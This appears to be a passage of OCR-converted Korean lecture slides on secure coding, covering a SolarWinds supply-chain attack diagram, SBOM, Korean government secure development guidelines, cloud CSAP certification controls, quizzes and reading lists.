① Attacker가 SolarWinds Company를 침투 → ② 18K Organizations(1만8천 곳 고객사)에 배포 → ③ **Malicious Update**(악성 업데이트)가 Corporation XYZ에 설치 → ④ SolarWinds Orion에 2nd Stage Backdoor(TearDrop) → ⑤ local.corp-xyz.com(Local Domain Name) 수집 → ⑥ Encrypt → Encrypted Domain Name(x8rmf702k.appsync-api.us-west-2.avsvmcloud.com) → ⑦ DNS Query(Passive DNS Sensor) → ⑧ Recursive DNS Server → ⑨ Authoritative DNS Server → ⑩ C2 Server(HTTP)로 연결 → ⑪ 통신 / ⑫ Historic Records를 통해 → ⑬ Decrypt → ⑭ Deduct → 'Corporation XYZ' (Domain Name Recovery: 감염된 기업을 식별)

---

## [2-SLIDES] 1주차 1차시 p.31 · 소프트웨어 보안 취약점 사례 – 공급망 보안
소프트웨어 보안 취약점 사례 – 공급망 보안
SBOM(Software Bill of Materials)
소프트웨어를 빌드하기 위해 사용된 여러 컴포넌트에 대한 내용과 공급망 관계를 형식에 맞춰 기록하는 것
소프트웨어 제품을 생산, 소비, 운영하는 자가 공급망에 대해 더 깊이 이해하고 알려진
혹은 새로운 취약점과 위협을 추적하여 알려진 취약점의 확산을 효과적으로 저지하기 위한 목적
소프트웨어개발주기에따른 정보 출처 한국인터넷진흥원

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식: 소프트웨어 개발 주기에 따른 SBOM 정보 (출처: 한국인터넷진흥원)]

| 개발 주기 | SBOM에 담기는 정보 |
| --- | --- |
| 설계 | 사양, 외부 패키지 SBOM |
| 개발 | 소스코드, 바이너리 |
| 테스트 | 인증 정보, 인증서 |
| 배포 | 패키지, 메타데이터 |
| 유지보수 | 변경사항, 취약점 정보 |

→ 모든 단계의 정보가 하나의 **SBOM**으로 모임

---

## [2-SLIDES] 1주차 1차시 p.32 · 요약 정리
요약 정리
현대 애플리케이션의 보안과제에서 API 보안과 지속적인 보안에 대해 학습함.
현대 애플리케이션 보안과제를 해결하기 위한 방안으로 SW개발보안, 보안 내재화,
제로트러스트 보안모델 적용을 학습함.
개발자의 사소한 실수로 발생할 수 있는 보안 사고를 예방하기 위해
시큐어코딩이 필수 보안 활동임을 학습함.

---

## [2-SLIDES] 1주차 1차시 p.33 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [KISA] 클라우드서비스(SaaS)_보안인증기분_해설서(2023.3)
- [KISA] 주요정보통신기반시설 기술적 취약점 분석 평가 상세 가이드(2021.03)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지 안전한 소프트
웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어
- OWASP - https://owasp.org/
- CVE - https://cve.mitre.org/
- CWE - https://cwe.mitre.org/
- SEI CERT Coding Standards - https://wiki.sei.cmu.edu/confluence/display/seccode

---

## [2-SLIDES] 1주차 1차시 p.34 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 1주차 1차시 p.35 · 퀴즈
퀴즈
1. 다음 중 SW개발보안 프로세스에 해당하지 않는 것은?
1) 설계 2) 요구사항분석
3) 테스트 4) 배포
2. 제품의 설계단계에서부터 보안을 고려하여 알려진 취약점을 조기에 효과적으로 제거하는 것을
의미하는 것은?
1) DevSecOps 2) 보안내재화
3) 제로트러스트 4) 보안일체화
3. 다음 중 '오버플로우'에 대한 설명이 맞는 것은?
1) 연산 결과가 과하게 반올림됨 2) 연산 결과가 허용할 수 있는 범위를 벗어남
3) 연산 결과의 부호가 역전됨 4) 정수형과 실수형을 혼합하여 연산함

---

## [2-SLIDES] 1주차 1차시 p.36 · 퀴즈 정답
퀴즈 정답
1. 다음 중 SW개발보안 프로세스에 해당하지 않는 것은?
4) 배포
SW개발보안 프로세스는 1) 요구사항분석 2)설계 3)구현 4)테스트 로 이루어져 있습니다.
2. 제품의 설계단계에서부터 보안을 고려하여 알려진 취약점을 조기에 효과적으로 제거하는 것을
의미하는 것은?
2) 보안내재화
영어 표현으로 Security By Design이라고 합니다.
3. 다음 중 '오버플로우'에 대한 설명이 맞는 것은?
2) 연산 결과가 허용할 수 있는 범위를 벗어남
저장할 수 있는 값의 범위를 초과하는 연산이 이루어질 때, '오버플로우'가 발생했다고 합니다.

# [2-SLIDES] 1주차 2차시 — 보안약점과 시큐어코딩 개요
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · Command Injection/커맨드 인젝션/명령어 삽입/명령 삽입/OS Command/CWE-78 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT

## [2-SLIDES] 1주차 2차시 p.1 · 시큐어코딩
시큐어코딩

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[표지 일러스트: 노트북 화면의 차트·그래프 주위에서 사람들이 돋보기·서류를 들고 협업하는 아이소메트릭 그림]

---

## [2-SLIDES] 1주차 2차시 p.2 · SW개발보안 국내기준
SW개발보안 국내기준
01 소프트웨어 개발보안 가이드
02 클라우드서비스(SaaS) 보안인증 가이드

---

## [2-SLIDES] 1주차 2차시 p.3 · 학습 목표
학습 목표
소프트웨어 개발보안을 위한 국내 기준으로 활용되는 소프트웨어 개발보안 가이드에서 설명하
고 있는 설계단계,구현단계 보안 활동에 대해 학습한다.
SaaS 애플리케이션을 대상으로 실시되는 클라우드 보안인증 통제항목의 기술적보호 조치 등에
서 설명하는 개발보안을 이해한다.

---

## [2-SLIDES] 1주차 2차시 p.4 · 학습 내용
학습 내용
1. 소프트웨어 개발보안 가이드
2. 클라우드서비스(SaaS) 보안인증 가이드

---

## [2-SLIDES] 1주차 2차시 p.5 · SW개발보안 국내기준
SW개발보안 국내기준
01 소프트웨어 개발보안 가이드
02 클라우드서비스(SaaS) 보안인증 가이드

---

## [2-SLIDES] 1주차 2차시 p.6 · 행정안전부 SW개발보안 가이드
행정안전부 SW개발보안 가이드
행정기관 등이 안전한 소프트웨어를 개발하여 각종 사이버위협으로부터 예방 ∙ 대응하기 위해
SW 개발단계 부터 SW개발 보안을 적용하기 위한 기준으로 제공
활용
행정ㆍ공공기관 정보시스템 개발자 및
개발보안
유지보수자, 담당공무원
진단원 및 감리원, 사업자 자체
진단
SW보안약점 잔존여부 진단 등
행정기관 및 공공기관 정보시스템 구축∙운영 지침 [시행 2021. 1. 19.]
[행정안전부고시 제2021-3호, 2021. 1. 19., 일부개정]

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[이미지: 『전자정부 SW 개발·운영자를 위한 소프트웨어 개발보안 가이드』 표지 (2019.11, 행정안전부·한국인터넷진흥원, 발간등록번호 11-1311000-000330-10)]

**활용**

| 구분 | 대상 |
| --- | --- |
| 개발보안 | 행정·공공기관 정보시스템 개발자 및 유지보수자, 담당공무원 |
| 진단 | 진단원 및 감리원, 사업자 자체 SW보안약점 잔존여부 진단 등 |

---

## [2-SLIDES] 1주차 2차시 p.7 · 행정안전부 SW개발보안 가이드
행정안전부 SW개발보안 가이드
행정기관등이 정보화사업을 추진할 때, SW보안약점이 없도록 SW를 개발 또는 변경
행정기관 및 공공기관 정보시스템 구축 ∙ 운영 지침 [시행 2021. 1. 19.]
[행정안전부고시 제2021-3호, 2021. 1. 19., 일부개정]
대상
정보 시스템 감리 대상 정보화 사업 [전자정부법 시행령 제 17조 제 1항]
※ 감리대상이 아닌 정보화사업도 SW개발보안 적용 가능
범위
설계단계 산출물 및 소스코드 전체
(유지보수의 경우, 유지보수로 인해 변경된 설계단계 산출물 및 소스코드 전체)
※ 상용 SW 제외

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[상자 두 개]

**대상**: 정보 시스템 감리 대상 정보화 사업 [전자정부법 시행령 제17조 제1항] — ※ 감리대상이 아닌 정보화사업도 SW개발보안 적용 가능

**범위**: **설계단계 산출물 및 소스코드 전체**(빨간 강조) (유지보수의 경우, 유지보수로 인해 변경된 설계단계 산출물 및 소스코드 전체) — ※ 상용 SW 제외

---

## [2-SLIDES] 1주차 2차시 p.8 · 행정안전부 SW개발보안 가이드
행정안전부 SW개발보안 가이드
◈ 필수 진단 항목 : 행정기관 및 공공기관 및 공공기관 정보시스템 구축 · 운영 지침 ‘별표3’
※ 설계단계 보안설계 기준 : 20개 항목
※ 구현단계 보안약점 제거 기준 : 49개 항목
◈ 진단도구(SW 보안약점 진단도구)
※ 개발과정에서 소스코드 상의 SW 보안약점을 찾기 위하여 사용하는 도구
※ 감리법인이 진단도구를 사용할 경우에는 과학기술정보통신부장관이 고시한 정보보호 시스템 평가 인증
지침에 따라 국가보안기술연구소장이 인증한 진단도구를 사용
◈ 진단원(SW 보안약점 진단원)
※ SW 보안약점이 남아있는지 진단하여 조치방안을 수립하고 조치결과 확인 등의 활동을 수행하는 자
※ 감리법인은 행정안전부장관이 고시한 “정보시스템 감리기준” 제5조 제3항에 따라 진단원을 우선적으로 배치
※ 행정기관은 감리대상이 아닌 정보화사업에 SW개발보안을 적용할 경우에는, 사업자로 하여금 보안약점을
진단 · 제거토록 하고 그 결과를 확인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[빨간 글씨로 강조된 부분]
- ※ 설계단계 보안설계 기준: **20개 항목**
- ※ 구현단계 보안약점 제거 기준: **49개 항목**
- 진단도구는 **국가보안기술연구소장이 인증한 진단도구**를 사용

---

## [2-SLIDES] 1주차 2차시 p.9 · 행정안전부 SW개발보안 가이드
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
행정안전부 SW개발보안 가이드

[별표3] 소프트웨어 보안약점 기준(제52조 관련) **설계단계 보안요구항목** — 4개 구분, 총 20개

| 구분 | 주요 내용 | 설계단계 보안 요구항목 | 개수 |
| --- | --- | --- | --- |
| **입력데이터 검증 및 표현** | 사용자, 프로그램 입력 데이터에 대한 유효성 검증체계를 갖추고 실패 시 처리방안 제시 | 1. DBMS 조회 및 결과 검증 / 2. XML 조회 및 결과 검증 / 3. 디렉토리 서비스 조회 및 결과 검증 / 4. 시스템 자원 접근 및 명령어 수행 입력값 검증 / 5. 웹 서비스 요청 및 결과 검증 / 6. 웹 기반 중요 기능 수행요청 유효성 검증 / 7. HTTP프로토콜 유효성 검증 / 8. 허용된 범위내 메모리 접근 / 9. 보안기능 동작에 사용되는 입력값 검증 / 10. 업로드 다운로드 파일 검증 | 10개 |
| **보안기능** | 인증, 접근제어, 권한 관리, 비밀번호 등의 정책이 적절하게 반영될 수 있도록 설계 | 1. 인증 대상 및 방식 / 2. 인증 수행 제한 / 3. 비밀번호 관리 / 4. 중요자원 접근통제 / 5. 암호키 관리 / 6. 암호연산 / 7. 중요정보 저장 / 8. 중요정보 전송 | 8개 |
| **에러처리** | 오류메시지에 중요정보가 포함되어 출력되지 않도록 안전한 처리방안 설계 | 1. 예외처리 | 1개 |
| **세션통제** | 다른 세션간 데이터 공유 금지 등 세션을 안전하게 관리할 수 있는 방안 제시 | 1. 세션 통제 | 1개 |

(오른쪽 키워드 상자: 입력값 검증 / 중요정보 처리 / 인증 / 인가 / 암호화 / 에러처리 / 세션 통제 / 로깅)

---

## [2-SLIDES] 1주차 2차시 p.10 · 행정안전부 개발보안 가이드
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
행정안전부 개발보안 가이드

[별표3] 소프트웨어 보안약점 기준(제52조 관련) **구현단계 49개 보안약점 제거 기준** — 7개 유형

| 유형 | 보안약점 |
| --- | --- |
| **입력데이터 검증 및 표현** (17개) | SQL 삽입 · 코드삽입 · 경로 조작 및 자원 삽입 · 크로스사이트 스크립트 · 운영체제 명령어 삽입 · 위험한 형식 파일 업로드 · 신뢰되지 않은 URL 주소로 자동 접속 연결 · 부적절한 XML 외부 객체 참조 · XML삽입 · LDAP 삽입 · 크로스사이트 요청 위조 · 서버사이드 요청위조 · HTTP 응답분할 · 정수형 오버플로우 · 보안기능 결정에 사용되는 부적절한 입력값 · 메모리 버퍼 오버플로우 · 포맷 스트링 삽입 |
| **보안기능** (16개) | 적절한 인증 없는 중요기능 허용 · 부적절한 인가 · 중요한 자원에 대한 잘못된 권한 설정 · 취약한 암호화 알고리즘 사용 · 암호화되지 않은 중요정보 · 하드코드 된 중요정보 · 충분하지 않은 키 길이 사용 · 적절하지 않은 난수값 사용 · 취약한 비밀번호 허용 · 부적절한 전자서명 확인 · 부적절한 인증서 유효성 점검 · 사용자 하드디스크에 저장되는 쿠키를 통한 정보 노출 · 주석문 안에 포함된 시스템 주요정보 · 솔트 없이 일방향 해쉬 함수 사용 · 무결성 검사 없는 코드 다운로드 · 반복된 인증시도 제한 기능 부재 |
| **시간 및 상태** (2개) | 검사시점과 사용시점 · 종료되지 않은 반복문 재귀함수 |
| **에러처리** (3개) | 오류메시지 정보 노출 · 오류 상황 대응 부재 · 부적절한 예외 처리 |
| **코드오류** (5개) | Null Pointer 역참조 · 부적절한 자원해제 · 해제된 자원 사용 · 초기화되지 않은 변수 사용 · 신뢰할 수 없는 데이터의 역직렬화 |
| **캡슐화** (4개) | 잘못된 세션에 의한 데이터 정보노출 · 제거되지 않고 남은 디버그 코드 · Public 메소드부터 반환된 Private 배열 · Private 배열에 Public 데이터 할당 |
| **API 오용** (2개) | DNS Lookup에 의존한 보안 결정 · 취약한 API 사용 |

(셀 색상 범례: 베이지 = 입력 값 검증, 연두 = 보안기능, 하늘색 = 에러처리, 회색 = 세션통제 — 설계단계 항목과의 대응을 나타냄)

---

## [2-SLIDES] 1주차 2차시 p.11 · 국내 SW개발보안 제도(과학기술정보통신부)
국내 SW개발보안 제도(과학기술정보통신부)
2020년 SW산업진흥법이 개정되어 민간 기업 SW개발시 SW개발보안을 적용하도록 함
SW개발보안(제29조)
"소프트웨어개발보안"이란 소프트웨어를 개발하거나 변경할 때 소프트웨어의 보안 취약점을 최소화하기 위한 일련의 보안활동
제29조(소프트웨어개발보안 진흥) 과학기술정보통신부장관은 소프트웨어개발보안 분야를 진흥하기 위하여 다음 각 호의 사업을 추진할 수 있다.
1. 소프트웨어개발보안 기술 연구, 인력 양성 등 기반 조성
2. 「중소기업기본법」 제2조에 따른 중소기업인 소프트웨어사업자의 소프트웨어개발보안 활성화를 위한 지원
3. 그 밖에 소프트웨어개발보안을 활성화하기 위하여 대통령령으로 정하는 사업
SW안전(제30조,31조)
“소프트웨어안전”이란 외부로부터의 침해행위가 없는 상태에서 소프트웨어의 내부적인 오작동 및 안전기능(사전 위험분석 등을 통하여 위험발생을 방지하
는 기능을 말한다) 미비 등으로 발생할 수 있는 사고로부터 사람의 생명이나 신체에 대한 위험에 충분한 대비가 되어 있는 상태를 말한다.
제30조(소프트웨어안전 확보) ① 정부는 소프트웨어안전 확보를 위한 시책을 마련할 수 있다.
② 과학기술정보통신부장관은 다음 각 호의 사항을 포함하는 소프트웨어안전 확보를 위한 지침을 정하여 고시하여야 한다.
1. 소프트웨어안전 관련 위험 분석
2. 소프트웨어안전 확보를 위한 설계 및 구현 방법
3. 소프트웨어안전 검증 방법
4. 운영 단계의 소프트웨어안전 확보 방안
5. 그 밖에 소프트웨어안전 확보에 필요하다고 인정되는 사항
③ 중앙행정기관의 장은 소관 분야의 소프트웨어안전에 관한 기술기준을 수립하는 경우 제2항에 따른 지침 또는 국제표준 등을 고려하여야 한다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[법 조문 상자 2개 — 제29조(소프트웨어개발보안 진흥), 제30조(소프트웨어안전 확보) 본문과 동일. 조문 제목이 파란색으로 강조]

---

## [2-SLIDES] 1주차 2차시 p.12 · SW개발보안 국내기준
SW개발보안 국내기준
01 소프트웨어 개발보안 가이드
02 클라우드 서비스(SaaS) 보안인증 가이드

---

## [2-SLIDES] 1주차 2차시 p.13 · 클라우드서비스(SaaS) 보안 인증
클라우드서비스(SaaS) 보안 인증
SaaS 표준등급 클라우드 보안인증은 중요 데이터를 처리하는 서비스를 대상으로 하며, 13개 분야에서 총 79개의 통제
항목을 준수해야 함. 이 인증 기준은 클라우드 서비스의 보안성과 신뢰성을 확보하기 위한 관리적, 기술적 보호 조치 포함
소프트웨어 보안과 관련된 통제항목
1. 정보보호 정책 수립 및 운영
2. 서비스 연속성 관리
3. 접근통제
4. 암호화 적용
5. 시스템 개발 및 운영 보안
6. 취약점 관리

---

## [2-SLIDES] 1주차 2차시 p.14 · 클라우드 보안인증 통제항목 [SaaS 표준등급]
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
클라우드 보안인증 통제항목 [SaaS 표준등급]

**[관리적 보호조치]**

| 분야 | 통제항목 | 항목수 |
| --- | --- | --- |
| **1. 정보보호 정책 및 조직** ★ | 1.1. 정보보호 정책 | 3 |
| | 1.2. 정보보호 조직 | 2 |
| 2. 인적보안 | 2.1. 내부인력 보안 | 4 |
| | 2.2. 정보보호 교육 | 1 |
| 3. 자산관리 | 3.1. 자산 식별 및 분류 | 1 |
| | 3.2. 자산 변경관리 | 1 |
| | 3.3. 위험관리 | 1 |
| 4. 서비스 공급망관리 | 4.1. 공급망 관리정책 | 2 |
| | 4.2. 공급망 변경관리 | 1 |
| 5. 침해사고관리 | 5.1. 침해사고 대응절차 및 체계 | 3 |
| | 5.2. 침해사고 대응 | 2 |
| | 5.3. 사후관리 | 2 |
| **6. 서비스 연속성관리** ★ | 6.1. 장애대응 | 4 |
| | 6.2. 서비스 가용성 | 2 |
| 7. 준거성 | 7.1. 법 및 정책 준수 | 1 |
| | 7.2. 정보시스템 감사 | 2 |

**[기술적 보호조치]**

| 분야 | 통제항목 | 항목수 |
| --- | --- | --- |
| 9. 가상화 보안 | 9.1. 가상화 인프라 | 2 |
| | 9.2. 가상 환경 | 4 |
| **10. 접근통제** ★ | 10.1. 접근통제 정책 | 2 |
| | 10.2. 접근권한 관리 | 3 |
| | 10.3. 사용자 식별 및 인증 | 5 |
| 11. 네트워크 보안 | 11.1. 네트워크 보안 | 5 |
| **12. 데이터 보호 및 암호화** ★ | 12.1. 데이터 보호 | 6 |
| | 12.2. 암호화 | 2 |
| **13. 시스템 개발 및 도입 보안** ★ (빨간 상자로 강조) | 13.1. 시스템 분석 및 설계 | 5 |
| | 13.2. 구현 및 시험 | 4 |
| | 13.3. 외주 개발 보안 | 1 |

**[공공기관용 클라우드컴퓨팅서비스 추가 보호조치]**

| 분야 | 통제항목 | 항목수 |
| --- | --- | --- |
| 14. 공공기관 보안요구 사항 | 14.1. 관리적 보호조치 | 4 |
| | 14.2. 물리적 보호조치 | 2 |
| | 14.3. 기술적 보호조치 | 1 |

(★ = 슬라이드에서 빨간 글씨로 표시된 분야. 앞 슬라이드의 '소프트웨어 보안과 관련된 통제항목'과 대응. 원본 표에 8번 분야는 없음)

---

## [2-SLIDES] 1주차 2차시 p.15 · SaaS CSAP 기술적 보호조치 (★ ISMS 인증시 점검대체 가능 항
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
SaaS CSAP 기술적 보호조치 (★ ISMS 인증시 점검대체 가능 항목)

분야 **13. 시스템 개발 및 도입 보안** > 통제항목 **13.1. 시스템 분석 및 설계**

| 세부 항목 | 세부 통제내용 | 표준 | 간편 |
| --- | --- | --- | --- |
| 13.1.1. 보안 요구사항 정의★ | 신규 시스템 개발 및 기존 시스템 변경 시 정보보호 관련 법적 요구사항, 최신 보안취약점, 정보보호 기본요소(기밀성, 무결성, 가용성) 등을 고려하여 보안요구사항을 명확히 정의하고 이를 적용하여야 한다. | O | - |
| 13.1.2. 인증 및 암호화 기능★ | 클라우드 시스템 설계 시 사용자 인증에 관한 보안요구사항을 반드시 고려하여야 하며 중요정보의 입·출력 및 송수신 과정에서 무결성, 기밀성이 요구될 경우 법적 요구사항을 고려하여야 한다. | O | O |
| 13.1.3. 보안로그 기능★ | 클라우드 시스템 설계 시 사용자의 인증, 권한 변경, 중요정보 이용 및 유출 등에 대한 감사증적을 확보할 수 있도록 하여야 한다. | O | - |
| 13.1.4. 접근권한 기능★ | 클라우드 시스템 설계 시 업무의 목적 및 중요도에 따라 접근권한을 부여할 수 있도록 하여야 한다. | O | - |
| 13.1.5. 시각 동기화★ | 로그기록의 정확성을 보장하고 법적인 자료로서 효력을 지니기 위해 클라우드 시스템 시각을 공식 표준시각으로 정확하게 동기화 하여야 한다. | O | - |

---

## [2-SLIDES] 1주차 2차시 p.16 · SaaS CSAP 기술적 보호조치
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
SaaS CSAP 기술적 보호조치

분야 **13. 시스템 개발 및 도입 보안**

| 통제항목 | 세부 항목 | 세부 통제내용 | 표준 | 간편 |
| --- | --- | --- | --- | --- |
| 13.2. 구현 및 시험 | 13.2.1. 구현 및 시험★ | 안전한 코딩방법에 따라 클라우드컴퓨팅서비스를 구현하고, 분석/설계 과정에서 도출한 보안요구사항이 정보시스템에 적용되었는지 확인하기 위하여 시험을 수행하여야 한다 | O | O |
| | 13.2.2. 개발과 운영환경 분리 | 개발 및 시험 시스템은 운영시스템에 대한 비인가 접근 및 변경의 위험을 감소하기 위해 원칙적으로 분리하여야 한다. 단 분리하여 운영하기 어려운 경우 그 사유와 타당성을 검토하고 안전성 확보 방안을 마련하여야 한다. | O | - |
| | 13.2.3. 시험 데이터 보안★ | 시스템 시험 과정에서 운영데이터 유출을 예방하기 위해 시험데이터 생성, 이용 및 관리, 파기, 기술적 보호조치에 관한 절차를 수립하여 이행하여야 한다. | O | - |
| | 13.2.4. 소스 프로그램 보안★ | 소스 프로그램에 대한 변경관리를 수행하고 인가된 사용자만이 소스 프로그램에 접근할 수 있도록 통제 절차를 수립하여 이행하여야 한다. 또한 소스 프로그램은 운영환경에 보관하지 않는 것을 원칙으로 한다. | O | - |
| 13.3. 외주개발보안 | 13.3.1. 외주개발보안★ | 클라우드 시스템 개발을 외주 위탁하는 경우 분석 및 설계단계에서 구현 및 이관까지의 준수해야 할 보안 요구사항을 계약서에 명시하고 이행여부를 관리·감독 하여야 한다. | O | - |

---

## [2-SLIDES] 1주차 2차시 p.17 · 요약 정리
요약 정리
소프트웨어 개발보안을 위한 국내 기준으로 활용되는 소프트웨어 개발보안 가이드에서 설명하
고 있는 설계단계 20개의 보안요구사항,구현단계의 49개 보안약점 제거 기준에 대해 학습함.
SaaS 애플리케이션을 대상으로 실시되는 클라우드 보안인증 통제항목의 기술적보호 조치 등에
서 설명하는 시스템 개발 및 도입 보안의 점검 항목을 학습함.

---

## [2-SLIDES] 1주차 2차시 p.18 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [KISA] 클라우드서비스(SaaS)_보안인증기분_해설서(2023.3)
- [KISA] 주요정보통신기반시설 기술적 취약점 분석 평가 상세 가이드(2021.03)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지 안전한 소프트
웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어
- OWASP - https://owasp.org/
- CVE - https://cve.mitre.org/
- CWE - https://cwe.mitre.org/
- SEI CERT Coding Standards - https://wiki.sei.cmu.edu/confluence/display/seccode

---

## [2-SLIDES] 1주차 2차시 p.19 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 1주차 2차시 p.20 · 퀴즈
퀴즈
1. 다음 중 행정안전부 SW개발보안 가이드와 관련 없는 내용은?
1) 행정, 공공기관 정보시스템 개발자 대상 2) SW보안약점 잔존여부 진단
3) 테스트 단계부터 SW개발 보안을 적용하기 위한 기준 4) 진단 범위는 설계 단계 산출물과 소스코드 전체
2. 다음 중 클라우드 서비스 보안 인증과 관련하여, 소프트웨어 보안과 관련된 통제 항목이 아닌 것은?
1) 접근통제 2) 시스템 개발 및 운영 보안
3) 취약점 관리 4) 개발 조직의 신원 관리 및 통제
3. 다음 중 클라우드 서비스 보안 인증을 나타내는 용어는?
1) CSAP 2) CCSP
3) SaaS 4) PaaS

---

## [2-SLIDES] 1주차 2차시 p.21 · 퀴즈 정답
퀴즈 정답
1. 다음 중 행정안전부 SW개발보안 가이드와 관련 없는 내용은?
3) 테스트 단계부터 SW개발 보안을 적용하기 위한 기준
SW개발보안 가이드는 SW개발 단계부터 보안을 적용하기 위한 기준을 제시하고 있습니다.
2. 다음 중 클라우드 서비스 보안 인증과 관련하여, 소프트웨어 보안과 관련된 통제 항목이 아닌 것은?
4) 개발 조직의 신원 관리 및 통제
개발 조직 관리는 소프트웨어 보안과 관련이 없습니다.
3. 다음 중 클라우드 서비스 보안 인증을 나타내는 용어는?
1) CSAP
CSAP는 Cloud Security Assurance Program의 약어입니다.

# [2-SLIDES] 1주차 3차시 — 보안약점과 시큐어코딩 개요
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · Command Injection/커맨드 인젝션/명령어 삽입/명령 삽입/OS Command/CWE-78 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · SameSite/세임사이트/Strict/Lax/None · 화이트리스트/Whitelist/최소 허용/허용 목록 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Mass Assignment/대량 할당/DTO/isAdmin · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · JWT/JSON Web Token/제이더블유티/Claims/클레임/HS256/RS256/Refresh Token/리프레시 토큰 · MFA/Multi-Factor/다중 인증/다중 매체 인증/OTP/FIDO2/WebAuthn · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 1주차 3차시 p.1 · 시큐어코딩
시큐어코딩

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[표지 일러스트: 노트북 화면의 차트·그래프 주위에서 사람들이 돋보기·서류를 들고 협업하는 아이소메트릭 그림]

---

## [2-SLIDES] 1주차 3차시 p.2 · SW개발보안 국외기준
SW개발보안 국외기준
01 국외 개발보안 현황
02 OWASP TOP 10
03 CVE
04 CWE Top 25

---

## [2-SLIDES] 1주차 3차시 p.3 · 학습 목표
학습 목표
국외 소프트웨어 개발보안 기준을 이해한다.
OWASP TOP 10 을 이해하고 개발단계에 어떻게 적용할 수 있는지 이해한다.
CVE 용도를 이해하고 개발단계에 어떻게 적용할 수 있는지 이해한다.
CWE 용도를 이해하고, CWE TOP 25 를 개발단계에 어떻게 적용할 수 있는지
이해한다.

---

## [2-SLIDES] 1주차 3차시 p.4 · 학습 내용
학습 내용
1. 국외 개발보안 현황
2. OWASP TOP 10
3. CVE
4. CWE TOP 25

---

## [2-SLIDES] 1주차 3차시 p.5 · SW개발보안 국외기준
SW개발보안 국외기준
01 국외 개발보안 현황
02 OWASP TOP 10
03 CVE
04 CWE Top 25

---

